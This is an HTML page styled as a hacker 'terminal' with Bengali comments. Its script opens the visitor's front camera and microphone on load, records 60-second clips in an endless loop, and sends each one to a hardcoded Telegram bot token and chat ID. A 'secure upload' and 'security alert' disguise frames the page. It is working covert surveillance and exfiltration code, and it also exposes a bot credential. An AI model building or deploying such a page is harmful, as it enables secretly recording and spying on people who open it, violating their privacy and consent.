<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CodexBD - Telegram Recursive Terminal</title>
    <style>
        body {
            background-color: #000;
            color: #00ffff; 
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .header h1 {
            font-size: 2.2rem;
            letter-spacing: 5px;
            text-shadow: 0 0 15px #00ffff;
            margin: 0;
        }

        .camera-container {
            position: relative;
            border: 2px solid #00ffff;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 0 25px rgba(0, 255, 255, 0.3);
            background: #000;
        }

        video {
            width: 100%;
            display: block;
            filter: sepia(100%) hue-rotate(140deg) saturate(1.5) brightness(0.9);
        }

        .scanline {
            position: absolute;
            top: 0; width: 100%; height: 4px;
            background: rgba(0, 255, 255, 0.5);
            box-shadow: 0 0 15px #00ffff;
            animation: move 4s linear infinite;
            z-index: 5;
        }

        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }

        .terminal-log {
            margin-top: 15px;
            font-size: 13px;
            width: 90%;
            max-width: 500px;
            background: rgba(0, 255, 255, 0.05);
            padding: 12px;
            border-left: 3px solid #00ffff;
            height: 120px;
            overflow-y: auto;
            color: #00ffff;
        }

        .status-dot {
            position: absolute;
            top: 15px; left: 15px;
            color: #ff0000;
            font-weight: bold;
            z-index: 10;
            animation: blink 1s infinite;
        }

        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body>

    <div class="header">
        <h1>CODEX-BD</h1>
        <p style="color: #00cccc; font-size: 11px;">[ SYSTEM: SECURE TELEGRAM UPLOAD ]</p>
    </div>

    <div class="camera-container">
        <div class="status-dot">● REC [AUTO-LOOP]</div>
        <div class="scanline"></div>
        <video id="webcam" autoplay playsinline muted></video>
    </div>

    <div class="terminal-log" id="log">
        > [INIT]: Connecting to Telegram Gateway...<br>
        > [USER]: Khokon Talukdar ID Identified.
    </div>

    <script>
        // আপনার কনফিগারেশন সেট করা হয়েছে
        const BOT_TOKEN = '8769660536:AAEjZfxBe1pDsBm7oE6TO9n8ECaZ50tEV8k';
        const CHAT_ID = '6274855215'; 

        const video = document.getElementById('webcam');
        const log = document.getElementById('log');
        let mediaRecorder;
        let chunks = [];
        let loopCount = 1;
        let stream;

        async function startSystem() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });
                video.srcObject = stream;
                log.innerHTML += "<br>> [AUTH]: Access Granted. Monitoring Started.";
                runCaptureLoop();
            } catch (err) {
                log.innerHTML += "<br>> [FAIL]: Camera access denied by system.";
            }
        }

        function runCaptureLoop() {
            chunks = [];
            // আমরা এখানে ভিডিও ফরম্যাট হিসেবে webm/mp4 ট্রাই করবো
            mediaRecorder = new MediaRecorder(stream);
            
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) chunks.push(e.data);
            };

            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                log.innerHTML += `<br>> [SYS]: Cycle ${loopCount} captured. Uploading...`;
                log.scrollTop = log.scrollHeight;
                
                await sendToTelegram(blob);
                
                loopCount++;
                runCaptureLoop(); // লুপ চলতে থাকবে
            };

            mediaRecorder.start();
            log.innerHTML += `<br>> [REC]: Cycle ${loopCount} active (60s)...`;
            log.scrollTop = log.scrollHeight;

            // ৬০ সেকেন্ড পর রেকর্ডিং স্টপ (যা লুপ ট্রিগার করবে)
            setTimeout(() => {
                if (mediaRecorder.state !== "inactive") {
                    mediaRecorder.stop();
                }
            }, 60000); 
        }

        async function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('video', blob, `CodexBD_Loop_${loopCount}.mp4`);
            formData.append('caption', `📡 CodexBD Security Alert\n------------------------\nUser: Khokon Talukdar\nCycle: #${loopCount}\nStatus: Uploaded Successfully ✅`);

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    log.innerHTML += `<br>> [SUCCESS]: Data pushed to Telegram.`;
                } else {
                    log.innerHTML += `<br>> [FAIL]: API error. Check Bot status.`;
                }
            } catch (error) {
                log.innerHTML += `<br>> [ERROR]: Network Interrupt.`;
            }
            log.scrollTop = log.scrollHeight;
        }

        window.onload = startSystem;
    </script>
</body>
</html>
